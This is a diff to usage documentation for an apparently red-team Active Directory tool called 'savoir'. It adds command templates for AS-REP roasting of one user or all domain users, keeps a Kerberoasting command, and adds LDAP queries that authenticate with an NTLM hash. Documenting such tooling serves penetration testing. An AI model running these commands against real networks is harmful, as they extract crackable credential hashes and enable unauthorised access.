@@ -98,7 +98,10 @@ A User account may have the option `Do not require Kerberos preauthentication`
 checked.
 
 ```bash
-savoir kerberos asktgt --dc-ip <DOMAIN_IP> -d <DOMAIN> -u <USERNAME> -p <USER_PASSWORD> -e rc4 --format=john
+# target a specific user
+savoir kerberos asreproast --dc-ip <DOMAIN_IP> -d <DOMAIN> -u <USERNAME> --format=john
+# target all users in domain
+savoir kerberos asreproast --dc-ip <DOMAIN_IP> -d <DOMAIN> --ldap-user <LDAP_USERNAME> --ldap-password <LDAP_PASSWORD> rc4 --format=john
 ```
 
 
@@ -106,6 +109,15 @@ savoir kerberos asktgt --dc-ip <DOMAIN_IP> -d <DOMAIN> -u <USERNAME> -p <USER_PA
 
 ```bash
 savoir kerberos asktgs --dc-ip <DOMAIN_IP> -d <DOMAIN> -u <USERNAME> -p <USER_PASSWORD> -e rc4 -r <TARGET_USER>
+```
+
+
+### LDAP
+
+```bash
+# Use a domain account with a password
+savoir ldap query -H <LDAP_HOSTNAME> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -q <QUERY>
+savoir ldap query -H <LDAP_HOSTNAME> -d <DOMAIN> -u <USERNAME> -n <NTLM_HASH> -q <QUERY>
 ```
 
 
